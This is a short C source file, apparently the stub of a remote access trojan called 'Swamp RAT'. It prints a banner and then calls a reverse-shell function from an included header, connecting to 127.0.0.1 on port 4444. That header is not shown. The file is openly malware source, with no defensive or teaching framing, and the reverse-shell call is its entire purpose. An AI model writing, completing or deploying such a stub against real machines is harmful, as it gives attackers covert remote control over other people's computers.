#include <stdio.h>
#include "include/stub/shell.h"

void help_menu(){
  printf("Swamp RAT Stub!\n");
}

int main(){
  help_menu();
  shell_reverse_tcp("127.0.0.1", 4444);
  return 0;
}
